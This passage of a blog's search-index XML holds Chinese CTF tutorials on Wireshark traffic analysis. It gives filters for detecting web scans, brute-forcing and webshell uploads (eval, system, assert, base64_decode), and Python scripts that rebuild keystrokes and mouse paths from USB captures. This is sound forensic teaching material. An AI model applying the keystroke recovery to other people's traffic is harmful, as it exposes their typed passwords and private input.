<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF流量分析</title>
      <link href="/2019/06/16/CTF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2019/06/16/CTF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="一、流量包修复"><a href="#一、流量包修复" class="headerlink" title="一、流量包修复"></a>一、流量包修复</h2><p>通过在线pacp包修复工具进行修复：</p><p><a href="http://f00l.de/hacking/pcapfix.php" target="_blank" rel="noopener">http://f00l.de/hacking/pcapfix.php</a></p><h2 id="二、WEB流量包分析"><a href="#二、WEB流量包分析" class="headerlink" title="二、WEB流量包分析"></a>二、WEB流量包分析</h2><p>WEB数据包分析主要包含WEB攻击行为的分析， 典型的WEB攻击行为有：WEB扫描、后台目录爆破、后台账号爆破、WEBSHELL上传、SQL注入等等。</p><h3 id="1-WEB扫描分析"><a href="#1-WEB扫描分析" class="headerlink" title="1. WEB扫描分析"></a>1. WEB扫描分析</h3><p>常见的WEB扫描器有Awvs，Netsparker，Appscan，Webinspect，Rsas（绿盟极光），Nessus，WebReaver，Sqlmap等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;扫描器特征值&quot;</span><br></pre></td></tr></table></figure><p>常见的扫描器特征参考：<a href="https://www.freebuf.com/column/156291.htm" target="_blank" rel="noopener">https://www.freebuf.com/column/156291.htm</a> </p><h3 id="2-后台目录爆破分析"><a href="#2-后台目录爆破分析" class="headerlink" title="2. 后台目录爆破分析"></a>2. 后台目录爆破分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;后台url特征&quot;</span><br></pre></td></tr></table></figure><p>常见后台url特征参考：<a href="https://www.freebuf.com/column/156291.html" target="_blank" rel="noopener">https://www.freebuf.com/column/156291.html</a> </p><h3 id="3-后台账号爆破"><a href="#3-后台账号爆破" class="headerlink" title="3. 后台账号爆破"></a>3. 后台账号爆破</h3><p>WEB账号登陆页面通常采用post方法请求，要获取流量包中记录的账号信息可通过wireshark筛选出POST请求和账号中的关键字如‘admin’。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http contains &quot;关键字&quot;</span><br></pre></td></tr></table></figure><h3 id="4-WEBSHELL上传"><a href="#4-WEBSHELL上传" class="headerlink" title="4. WEBSHELL上传"></a>4. WEBSHELL上传</h3><p>Webshell文件上传常采用post方法请求，文件内容常见关键字eval，system，assert。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http contains &quot;关键字&quot;</span><br><span class="line">http contains &quot;base64_decode&quot;#菜刀特征</span><br></pre></td></tr></table></figure><h3 id="5-数据库密码"><a href="#5-数据库密码" class="headerlink" title="5. 数据库密码"></a>5. 数据库密码</h3><p>一般是读config文件查看数据库密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;&lt;?php&quot;</span><br></pre></td></tr></table></figure><h3 id="6-数据库中内容"><a href="#6-数据库中内容" class="headerlink" title="6. 数据库中内容"></a>6. 数据库中内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql contains &quot;关键字&quot;</span><br></pre></td></tr></table></figure><h3 id="7-vpn及其ip"><a href="#7-vpn及其ip" class="headerlink" title="7. vpn及其ip"></a>7. vpn及其ip</h3><p>查看TCP流量最多的IP</p><h2 id="三、USB流量包分析"><a href="#三、USB流量包分析" class="headerlink" title="三、USB流量包分析"></a>三、USB流量包分析</h2><p>USB流量指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。</p><h3 id="1-键盘流量"><a href="#1-键盘流量" class="headerlink" title="1. 键盘流量"></a>1. 键盘流量</h3><p>USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。其中键盘击键信息集中在第三个字节中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usb.capdata</span><br></pre></td></tr></table></figure><ol><li><p>使用kali linux中的<code>tshark</code> 命令把<code>cap data</code>提取出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure></li><li><p>去除空行</p><p>word里替换 <code>^p^p</code> 为 <code>^p</code>，但是这样显得很不专业，下面是更优雅一点的做法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;/^$/d&quot; usbdata.txt</span><br></pre></td></tr></table></figure></li><li><p>根据<a href="https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html" target="_blank" rel="noopener">《USB键盘协议中键码》</a>中的HID Usage ID将数据还原成键位。</p><p>这里贴下漏斗社区上的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">"A"</span>,  <span class="number">0x05</span>:<span class="string">"B"</span>,  <span class="number">0x06</span>:<span class="string">"C"</span>, <span class="number">0x07</span>:<span class="string">"D"</span>, <span class="number">0x08</span>:<span class="string">"E"</span>, <span class="number">0x09</span>:<span class="string">"F"</span>, <span class="number">0x0A</span>:<span class="string">"G"</span>,  <span class="number">0x0B</span>:<span class="string">"H"</span>, <span class="number">0x0C</span>:<span class="string">"I"</span>,  <span class="number">0x0D</span>:<span class="string">"J"</span>, <span class="number">0x0E</span>:<span class="string">"K"</span>, <span class="number">0x0F</span>:<span class="string">"L"</span>, <span class="number">0x10</span>:<span class="string">"M"</span>, <span class="number">0x11</span>:<span class="string">"N"</span>,<span class="number">0x12</span>:<span class="string">"O"</span>,  <span class="number">0x13</span>:<span class="string">"P"</span>, <span class="number">0x14</span>:<span class="string">"Q"</span>, <span class="number">0x15</span>:<span class="string">"R"</span>, <span class="number">0x16</span>:<span class="string">"S"</span>, <span class="number">0x17</span>:<span class="string">"T"</span>, <span class="number">0x18</span>:<span class="string">"U"</span>,<span class="number">0x19</span>:<span class="string">"V"</span>, <span class="number">0x1A</span>:<span class="string">"W"</span>, <span class="number">0x1B</span>:<span class="string">"X"</span>, <span class="number">0x1C</span>:<span class="string">"Y"</span>, <span class="number">0x1D</span>:<span class="string">"Z"</span>, <span class="number">0x1E</span>:<span class="string">"1"</span>, <span class="number">0x1F</span>:<span class="string">"2"</span>, <span class="number">0x20</span>:<span class="string">"3"</span>, <span class="number">0x21</span>:<span class="string">"4"</span>, <span class="number">0x22</span>:<span class="string">"5"</span>,  <span class="number">0x23</span>:<span class="string">"6"</span>, <span class="number">0x24</span>:<span class="string">"7"</span>, <span class="number">0x25</span>:<span class="string">"8"</span>, <span class="number">0x26</span>:<span class="string">"9"</span>, <span class="number">0x27</span>:<span class="string">"0"</span>, <span class="number">0x28</span>:<span class="string">"\n"</span>, <span class="number">0x2a</span>:<span class="string">"[DEL]"</span>,  <span class="number">0X2B</span>:<span class="string">"    "</span>, <span class="number">0x2C</span>:<span class="string">" "</span>,  <span class="number">0x2D</span>:<span class="string">"-"</span>, <span class="number">0x2E</span>:<span class="string">"="</span>, <span class="number">0x2F</span>:<span class="string">"["</span>,  <span class="number">0x30</span>:<span class="string">"]"</span>,  <span class="number">0x31</span>:<span class="string">"\\"</span>, <span class="number">0x32</span>:<span class="string">"~"</span>, <span class="number">0x33</span>:<span class="string">";"</span>,  <span class="number">0x34</span>:<span class="string">"'"</span>, <span class="number">0x36</span>:<span class="string">","</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">'[unknown]'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'output :\n'</span> + output</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 .\keyboard.py</span><br></pre></td></tr></table></figure></li></ol><h3 id="2-鼠标流量"><a href="#2-鼠标流量" class="headerlink" title="2. 鼠标流量"></a>2. 鼠标流量</h3><p>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节。</p><p>其中第一个字节代表按键，当取0×00时，代表没有按键、为0×01时，代表按左键，为0×02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。</p><ol><li><p>使用kali linux中的<code>tshark</code> 命令把<code>cap data</code>提取出来，并去除空行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt &amp;&amp; sed -i &quot;/^$/d&quot; usbdata.txt</span><br></pre></td></tr></table></figure></li><li><p>根据usb协议鼠标数据还原鼠标移动轨迹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python mouse.py &gt; &apos;xy.txt&apos;</span><br><span class="line">gnuplot</span><br><span class="line">plot &quot;xy.txt&quot;</span><br></pre></td></tr></table></figure><p>或者另一个脚本直接运行出结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python UsbMiceDataHacker.py usb2.pcap RIGHT</span><br></pre></td></tr></table></figure><p>mouse.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nums = [] </span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>,<span class="string">'r'</span>) </span><br><span class="line">posx = <span class="number">0</span> </span><br><span class="line">posy = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys: </span><br><span class="line"><span class="keyword">if</span> len(line) != <span class="number">12</span> : </span><br><span class="line"><span class="keyword">continue</span> </span><br><span class="line">x = int(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>) </span><br><span class="line">y = int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>) </span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">127</span> : </span><br><span class="line">x -= <span class="number">256</span> </span><br><span class="line"><span class="keyword">if</span> y &gt; <span class="number">127</span> : </span><br><span class="line">y -= <span class="number">256</span> </span><br><span class="line">posx += x </span><br><span class="line">posy += y </span><br><span class="line">btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing </span></span><br><span class="line"><span class="keyword">if</span> btn_flag == <span class="number">1</span> : </span><br><span class="line"><span class="keyword">print</span> posx,posy </span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure><p>UsbMiceDataHacker.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">mousePositionX = <span class="number">0</span></span><br><span class="line">mousePositionY = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">X = []</span><br><span class="line">Y = []</span><br><span class="line"></span><br><span class="line">DataFileName = <span class="string">"usb.dat"</span></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> mousePositionX</span><br><span class="line">    <span class="keyword">global</span> mousePositionY</span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        python UsbMiceHacker.py data.pcap [LEFT|RIGHT|MOVE|ALL]"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Tips : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        To use this python script , you must install the numpy,matplotlib first."</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        You can use `sudo pip install matplotlib numpy` to install it"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Author : "</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        WangYihang &lt;wangyihanger@gmail.com&gt;"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        If you have any questions , please contact me by email."</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"        Thank you for using."</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get argv</span></span><br><span class="line">    pcapFilePath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    action = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> action != <span class="string">"LEFT"</span> <span class="keyword">and</span> action != <span class="string">"ALL"</span> <span class="keyword">and</span> action != <span class="string">"RIGHT"</span> <span class="keyword">and</span> action != <span class="string">"MOVE"</span>:</span><br><span class="line">        action = <span class="string">"LEFT"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get data of pcap</span></span><br><span class="line">    command = <span class="string">"tshark -r '%s' -T fields -e usb.capdata &gt; %s"</span> % (</span><br><span class="line">        pcapFilePath, DataFileName)</span><br><span class="line">    <span class="keyword">print</span> command</span><br><span class="line">    os.system(command)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read data</span></span><br><span class="line">    <span class="keyword">with</span> open(DataFileName, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            data.append(line[<span class="number">0</span>:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># handle move</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        Bytes = i.split(<span class="string">":"</span>)</span><br><span class="line">        <span class="keyword">if</span> len(Bytes) == <span class="number">8</span>:</span><br><span class="line">            horizontal = <span class="number">2</span>  <span class="comment"># -</span></span><br><span class="line">            vertical = <span class="number">4</span>  <span class="comment"># |</span></span><br><span class="line">        <span class="keyword">elif</span> len(Bytes) == <span class="number">4</span>:</span><br><span class="line">            horizontal = <span class="number">1</span>  <span class="comment"># -</span></span><br><span class="line">            vertical = <span class="number">2</span>  <span class="comment"># |</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        offsetX = int(Bytes[horizontal], <span class="number">16</span>)</span><br><span class="line">        offsetY = int(Bytes[vertical], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> offsetX &gt; <span class="number">127</span>:</span><br><span class="line">            offsetX -= <span class="number">256</span></span><br><span class="line">        <span class="keyword">if</span> offsetY &gt; <span class="number">127</span>:</span><br><span class="line">            offsetY -= <span class="number">256</span></span><br><span class="line">        mousePositionX += offsetX</span><br><span class="line">        mousePositionY += offsetY</span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">"01"</span>:</span><br><span class="line">            <span class="comment"># print "[+] Left butten."</span></span><br><span class="line">            <span class="keyword">if</span> action == <span class="string">"LEFT"</span>:</span><br><span class="line">                <span class="comment"># draw point to the image panel</span></span><br><span class="line">                X.append(mousePositionX)</span><br><span class="line">                Y.append(-mousePositionY)</span><br><span class="line">        <span class="keyword">elif</span> Bytes[<span class="number">0</span>] == <span class="string">"02"</span>:</span><br><span class="line">            <span class="comment"># print "[+] Right Butten."</span></span><br><span class="line">            <span class="keyword">if</span> action == <span class="string">"RIGHT"</span>:</span><br><span class="line">                <span class="comment"># draw point to the image panel</span></span><br><span class="line">                X.append(mousePositionX)</span><br><span class="line">                Y.append(-mousePositionY)</span><br><span class="line">        <span class="keyword">elif</span> Bytes[<span class="number">0</span>] == <span class="string">"00"</span>:</span><br><span class="line">            <span class="comment"># print "[+] Move."</span></span><br><span class="line">            <span class="keyword">if</span> action == <span class="string">"MOVE"</span>:</span><br><span class="line">                <span class="comment"># draw point to the image panel</span></span><br><span class="line">                X.append(mousePositionX)</span><br><span class="line">                Y.append(-mousePositionY)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print "[-] Known operate."</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">"ALL"</span>:</span><br><span class="line">            <span class="comment"># draw point to the image panel</span></span><br><span class="line">            X.append(mousePositionX)</span><br><span class="line">            Y.append(-mousePositionY)</span><br><span class="line"></span><br><span class="line">    fig = plt.figure()</span><br><span class="line">    ax1 = fig.add_subplot(<span class="number">111</span>)</span><br><span class="line"></span><br><span class="line">    ax1.set_title(<span class="string">'[%s]-[%s] Author : WangYihang'</span> % (pcapFilePath, action))</span><br><span class="line">    ax1.scatter(X, Y, c=<span class="string">'r'</span>, marker=<span class="string">'o'</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clean temp data</span></span><br><span class="line">    os.system(<span class="string">"rm ./%s"</span> % (DataFileName))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li></ol><p>参考：</p><p>《CTF流量分析之题型深度解析》，<a href="https://www.freebuf.com/column/201830.html" target="_blank" rel="noopener">https://www.freebuf.com/column/201830.html</a></p><p>《记一道USB流量分析CTF题》，<a href="https://blog.csdn.net/qq_36609913/article/details/78578406" target="_blank" rel="noopener">https://blog.csdn.net/qq_36609913/article/details/78578406</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wireshark入门分析</title>
      <link href="/2019/06/15/Wireshark%E5%85%A5%E9%97%A8%E5%88%86%E6%9E%90/"/>
      <url>/2019/06/15/Wireshark%E5%85%A5%E9%97%A8%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="一、网卡模式"><a href="#一、网卡模式" class="headerlink" title="一、网卡模式"></a>一、网卡模式</h2><h3 id="标准模式"><a href="#标准模式" class="headerlink" title="标准模式"></a>标准模式</h3><p>网卡只接收目标地址是自己的数据包。</p><h3 id="混杂模式"><a href="#混杂模式" class="headerlink" title="混杂模式"></a>混杂模式</h3><p>只要数据包经过网卡，网卡就会接受该包，不管其目的地址是否为自己。</p><p><strong>混杂模式设置：</strong></p><p>网络与共享中心–&gt;本地连接–&gt;属性–&gt;配置–&gt;高级–&gt;网速与全双工–&gt;auto（自动匹配）</p> <a id="more"></a><h2 id="二、使用wireshark分析HTTP数据包"><a href="#二、使用wireshark分析HTTP数据包" class="headerlink" title="二、使用wireshark分析HTTP数据包"></a>二、使用wireshark分析HTTP数据包</h2><h3 id="封包详细信息"><a href="#封包详细信息" class="headerlink" title="封包详细信息"></a>封包详细信息</h3><ul><li>Frame 数据帧情况 –&gt;物理层<ul><li>接口id</li><li>封装类型</li><li>捕获时间</li><li>时间戳</li><li>帧序列号</li><li>帧长度</li><li>捕获长度</li></ul></li><li>Ethernet Ⅱ 数据链路层 以太网帧头部信息<ul><li>目标mac</li><li>源mac</li><li>IP类型（跟下一层有关）</li></ul></li><li><p>IPv4：网络层</p><ul><li>版本</li><li>头部长度</li><li>差分服务字段</li><li>总长度</li><li>标志字段</li><li>标记字段</li><li>TTL</li><li><p>上层协议</p></li><li><p>头部数据的校验和</p></li><li>源IP</li><li>目的IP</li></ul></li><li><p>Transmission Control Protocol    传输层</p><ul><li>源端口</li><li>目的端口</li><li>序列号</li><li>下一个序列号</li><li>确认号</li><li>头部长度</li><li>标记</li><li>窗口大小</li><li>校验和</li><li>urgent_pointer紧急指针</li></ul></li><li><p>Hypertext Transfer Protocol    </p><p>接下来跟浏览器抓包的内容大致相同，这里就省略了。</p></li></ul><h2 id="三、基本功能"><a href="#三、基本功能" class="headerlink" title="三、基本功能"></a>三、基本功能</h2><h3 id="数据包筛选"><a href="#数据包筛选" class="headerlink" title="数据包筛选"></a>数据包筛选</h3><p>协议筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcp  筛选协议为tcp的流量包</span><br><span class="line">udp 筛选协议为udp的流量包</span><br><span class="line">arp/icmp/http/ftp/dns/ip  筛选协议为arp/icmp/http/ftp/dns/ip的流量包</span><br></pre></td></tr></table></figure><p>mac地址筛选:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eth.dst ==A0:00:00:04:C5:84 筛选目标mac地址</span><br><span class="line">eth.addr==A0:00:00:04:C5:84 筛选MAC地址</span><br></pre></td></tr></table></figure><p>IP筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 192.168.1.1 找源是192.168.1.1的记录</span><br><span class="line">#或者右键IPv4下的Source字段，作为过滤器应用-选中</span><br><span class="line">ip.dst == 192.168.1.2 找目的IP是192.168.1.2的记录</span><br><span class="line">#或者右键IPv4下的Destination字段，作为过滤器应用-选中</span><br><span class="line">ip.addr == 192.168.1.1 找记录中含有192.168.1.1的（不分源和目的）</span><br></pre></td></tr></table></figure><p>端口筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcp.port == 80   端口是80的记录</span><br><span class="line">tcp.dstport == 80  筛选tcp协议的目标端口为80 的流量包</span><br><span class="line">tcp.srcport == 80  筛选tcp协议的源端口为80 的流量包</span><br><span class="line">udp.srcport == 80  筛选udp协议的源端口为80 的流量包</span><br></pre></td></tr></table></figure><p>http请求筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">请求方法为GET：</span><br><span class="line">http.request.method==&quot;GET&quot;#筛选HTTP请求方法为GET的流量包</span><br><span class="line"></span><br><span class="line">请求方法为POST：</span><br><span class="line">http.request.method==&quot;POST&quot;#筛选HTTP请求方法为POST的流量包</span><br><span class="line"></span><br><span class="line">指定URI：</span><br><span class="line">http.request.uri==&quot;/img/logo-edu.gif&quot; #筛选HTTP请求的URL为/img/logo-edu.gif的流量包</span><br><span class="line"></span><br><span class="line">请求或相应中包含特定内容：</span><br><span class="line">http contains &quot;FLAG&quot;#筛选HTTP内容为/FLAG的流量包</span><br></pre></td></tr></table></figure><p>包长度筛选：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">udp.length ==20筛选长度为20的udp流量包</span><br><span class="line">tcp.len &gt;=20筛选长度大于20的tcp流量包</span><br><span class="line">ip.len ==20 筛选长度为20的IP流量包</span><br><span class="line">frame.len ==20 筛选长度为20的整个流量包</span><br></pre></td></tr></table></figure><p>连接符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and&amp;</span><br><span class="line">or||</span><br></pre></td></tr></table></figure><h3 id="数据包搜索"><a href="#数据包搜索" class="headerlink" 